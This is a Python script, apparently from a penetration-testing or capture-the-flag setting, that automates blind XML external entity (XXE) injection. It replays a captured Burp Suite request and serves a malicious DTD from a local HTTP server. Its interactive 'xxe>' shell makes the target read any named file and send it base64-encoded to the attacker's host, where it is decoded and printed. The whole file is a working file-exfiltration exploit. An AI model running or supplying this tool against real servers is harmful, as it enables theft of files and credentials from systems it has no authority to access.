import argparse
from threading import Thread
import http.server
import requests
import re
from base64 import b64decode
from cmd import Cmd

# Setup payload to be global.
payload = b'This would be the payload... IF IT EXISTED\n'
endpoint = ''

def load_request_from_file(filename, ssl=False):
    """
    Load request from burpsuite file.
    """
    with open(filename, 'r') as f:
        request_data = f.read()
        headers, body = request_data.replace('\r', '').split('\n\n')

    method = headers.split(' ')[0]
    path = headers.split(' ')[1]
    headers = dict([header.split(': ') for header in headers.split("\n")[1:]])
    path = f'http://{headers["Host"]}{path}'
    if ssl:
        path = f'https://{headers["Host"]}{path}'

    # SYSTEM "http://10.10.14.8:8000/test.dtd
    search = re.search(r'SYSTEM "[https]*:\/\/(.*?)/', body)
    endpoint = search.group(1)

    return method, path, headers, body, endpoint

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','application/xml')
        self.end_headers()
        if self.path.endswith('.dtd'):
            """
            If ends with DTD, we send the payload (global variable).
            """
            self.wfile.write(payload.encode())
            return
        elif self.path[:5] == '/b64/':
            """
            Server is responding to us with base64
            """
            try:
                data = b64decode(self.path[5:])
                print(data.decode())
            except Exception as e:
                print(e)
        else:
            """
            Unexpected currently
            """
            print(self.path)
            return

class Terminal(Cmd):
    prompt = 'xxe> '
    def default(self, args):    
        global payload
        payload = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={args}">
<!ENTITY % payload "<!ENTITY &#37; run SYSTEM 'http://{endpoint}/b64/%file;'>"> %payload;
%run;"""
        r = requests.request(method, path, headers=headers, data=body)

def run():
    server_address = ('', 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XXE Blind Injection Exfiltration')
    parser.add_argument('-r', '--request', help='Burpsuite Request File', required=True)
    parser.add_argument('-s', '--ssl', help='Use SSL', action='store_true')
    args = parser.parse_args()
    if args.ssl:
        method, path, headers, body, endpoint = load_request_from_file(args.request, ssl=True)
    else:
        method, path, headers, body, endpoint = load_request_from_file(args.request)
    
    # Start HTTP Server
    t = Thread(target=run)
    t.start()    
    
    # Start Terminal
    terminal = Terminal()
    terminal.cmdloop()
